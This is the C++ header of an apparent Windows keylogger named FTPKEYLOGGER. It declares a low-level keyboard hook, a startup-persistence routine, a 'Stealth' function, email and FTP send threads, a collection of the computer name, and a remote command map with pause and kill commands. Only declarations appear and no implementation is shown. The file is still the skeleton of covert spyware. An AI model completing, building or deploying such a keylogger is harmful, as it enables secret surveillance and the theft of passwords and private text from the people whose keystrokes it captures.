#ifndef FTPKEYLOGGER_H_
#define FTPKEYLOGGER_H_

#include <iostream>
#include <windows.h>
#include <process.h>
#include <string>
#include <Wininet.h>
#include <vector>
#include <map>
#include <ctime>
#include <windows.h>
#include <Shlwapi.h>
#include "email.h"

using std::string;
using std::cout;
using std::cin;
using std::vector;
using std::map;


unsigned int __stdcall keylogthreadhook(void *);
unsigned int __stdcall sendmail(void *);
LRESULT CALLBACK LowLevelKeyboardProc(int, WPARAM, LPARAM);

string gettime();
void AddtoStartup();
void RemoveFromStartup();
void Stealth();

extern unsigned int threadid;

extern bool killswitch;

extern DWORD numberread, numberwritten;
extern DWORD err;

extern string tempkeylog_buffer;
extern const string RegistryKeyName;

extern char pathtofile[MAX_PATH];
extern char ftpreadbuffer[1024];
extern char computername[4096];

enum COMMAND{CONTINUE, PAUSE, KILL};

extern map<string, COMMAND> cmds;

extern vector<string> filetokens;




#endif
